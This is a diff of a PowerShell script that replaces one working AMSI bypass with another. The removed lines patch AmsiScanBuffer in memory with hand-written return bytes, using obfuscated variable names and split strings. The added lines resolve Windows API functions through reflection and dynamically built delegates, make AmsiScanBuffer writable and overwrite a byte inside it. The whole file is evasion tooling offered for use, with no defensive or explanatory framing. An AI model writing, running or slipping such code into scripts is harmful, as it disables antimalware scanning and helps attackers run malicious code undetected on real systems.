@@ -1,26 +1,46 @@
-$MethodDefinition = "
-[DllImport(`"kernel32`")]
-public static extern IntPtr GetCurrentProcess();
-[DllImport(`"kernel32`")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport(`"kernel32`")]
-public static extern IntPtr GetModuleHandle(string lpModuleName);
-[DllImport(`"kernel32`")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-[DllImport(`"kernel32`")]
-public static extern bool WriteProcessMemory(IntPtr hModule, IntPtr lpAddress, Byte[] lpBuffer, UInt32 dwSize, ref UInt32 lpNumberOfBytesWritten);
-";
-$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
-${AB`sd} = ("{1}{2}{4}{3}{0}"-f 'er','A','msiSca','f','nBuf');
-${ha`NdLE} = [Win32.Kernel32]::GetModuleHandle(("{0}{1}{2}" -f'ams','i.d','ll'));
-[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
-[UInt32]$Size = 0x5;
-[UInt32]$ProtectFlag = 0x40;
-[UInt32]$OldProtectFlag = 0;
-[Win32.Kernel32]::VirtualProtect(${B`UFFErA`d`Dre`ss}, ${sI`ze}, ${pr`OtecT`Fl`Ag}, [Ref]${O`lD`P`ROt`ECtflAg});
-${Ti`Ti}=${bU`F`FeRa`dDRess}
-[Byte[]]${b`Uf} = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
-${hAnD`L`e2} = [Win32.Kernel32]::GetCurrentProcess();
+function getProcAddress 
+{
+    Param ($dllName, $functionName)
+    $getAssemblies = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 
-[UInt32]${lpnUm`BEroFby`T`esWRI`T`Ten} = 0
-[Win32.Kernel32]::WriteProcessMemory(${haNd`le2}, ${BUffE`RAD`d`RESs}, ${b`Uf}, 6, [ref]${lPn`UMBErofB`YTES`wRIttEn});
+    return $getAssemblies.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef],[String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($getAssemblies.GetMethod('GetModuleHandle')).Invoke($null, @($dllName)))), $functionName))
+}
+
+function gDT 
+{
+    Param 
+    (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+
+    $defineDynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly( (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    
+    $defineDynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    
+    $defineDynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+    return $defineDynamicAssembly.CreateType()
+}
+
+[IntPtr]$ptrGO = (getProcAddress amsi.dll AmsiScanBuffer)
+
+[Uint32]$old = 0
+[Uint32]$size = 0x255
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll VirtualProtect), 
+    (gDT @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke([IntPtr]$ptrGO, [UIntPtr]$size, 0x40, [Ref]$old)
+
+[Byte[]] $buf = 0x00
+$gch = [System.Runtime.InteropServices.GCHandle]::Alloc($buf, [System.Runtime.InteropServices.GCHandleType]::Pinned)
+$ptr = $gch.AddrOfPinnedObject()
+
+[long]$toto = [long]$ptrGO+[long]0x80
+
+$handler = -1
+[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
+$DllPathSize = [UIntPtr][UInt64]( 1)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll WriteProcessMemory), 
+    (gDT @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool]))).Invoke([IntPtr]$handler, $toto, $ptr, $DllPathSize, [Ref]$NumBytesWritten)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll VirtualProtect), 
+    (gDT @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke([IntPtr]$ptrGO, [UIntPtr]$size, $old, [Ref]$old)
